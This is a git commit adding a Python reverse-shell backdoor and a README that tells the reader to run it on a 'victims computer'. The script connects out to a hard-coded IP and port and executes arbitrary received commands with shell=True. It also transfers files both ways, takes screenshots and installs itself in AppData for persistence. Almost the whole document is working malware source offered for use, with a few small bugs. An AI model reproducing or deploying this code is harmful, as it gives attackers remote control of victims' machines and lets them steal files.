8bfc015401bf842c2be62997b9d7988648bca837
VishnuChebolu <cheboluvishnu@gmail.com>
2021-11-10 10:05:02 -0500

    backdoor uploaded

---
+++ README.md
@@ -0,0 +1,12 @@
+## This is a backdoor created in python3
+
+### Run the file `listener.py` in your machine and make the file `backdoor.py` run in the victims computer. It throws the reverse shell to you.
+
+## Available options in the ReverseShell are:
+
+1. quit                                --> Quit Session With The Target
+2. clear                               --> Clear The Screen
+3. cd *Directory Name*                 --> Changes Directory On Target System
+4. upload *file name*                  --> Upload File To The target Machine
+5. download *file name*                --> Download File From Target Machine
+6. persistence *RegName* *fileName*    --> Create Persistence In Registry
---
+++ backdoor.py
@@ -0,0 +1,98 @@
+import socket
+import json
+import subprocess
+import time
+import os
+import pyautogui
+import threading
+import shutil
+import sys
+
+
+count = 0
+
+def reliable_send(data):
+    jsondata = json.dumps(data)
+    s.send(jsondata.encode())
+
+def reliable_recv():
+    data = ''
+    while True:
+        try:
+            data = data + s.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
+def download_file(file_name):
+    f = open(file_name, 'wb')
+    s.settimeout(1)
+    chunk = s.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = s.recv(1024)
+        except socket.timeout:
+            break
+    s.settimeout(None)
+    f.close()
+
+def upload_file(file_name):
+    f = open(file_name, 'rb')
+    s.send(f.read())
+
+def screenshot():
+    pyautogui.screenshot().save('screenshot'+str(count)+'.png')
+    count+=1
+    
+
+def persist(copy_name): #persist(reg_name, copy_name)
+    file_location = os.environ['appdata'] + '\\' + copy_name
+    try:
+        if not os.path.exists(file_location):
+            shutil.copyfile(sys.executable, file_location)
+            #subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
+            #reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
+        else:
+            reliable_send('[+] Persistence Already Exists')
+    except Exception:
+        reliable_send('[+] Error Creating Persistence With The Target Machine')
+
+def shell():
+    while True:
+        command = reliable_recv()
+        if command == 'quit':
+            break
+        elif command == 'background':
+            continue
+        elif command == 'help':
+            continue
+        elif command == 'clear':
+            continue
+        elif command[:3] == 'cd ':
+            os.chdir(command[3:])
+        elif command[:6] == 'upload':
+            download_file(command[7:])
+        elif command[:8] == 'download':
+            upload_file(command[9:])
+        elif command[:10] == 'screenshot':
+            screenshot()
+            upload_file('screen.png')
+            os.remove('screen.png')
+        elif command[:11] == 'persistence':
+            copy_name = command[12:]
+            persist(copy_name)
+        elif command[:7] == 'sendall':
+            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin = subprocess.PIPE)
+        else:
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
+            reliable_send(result)
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.64.122", 5555))
+shell()
+s.close()
+
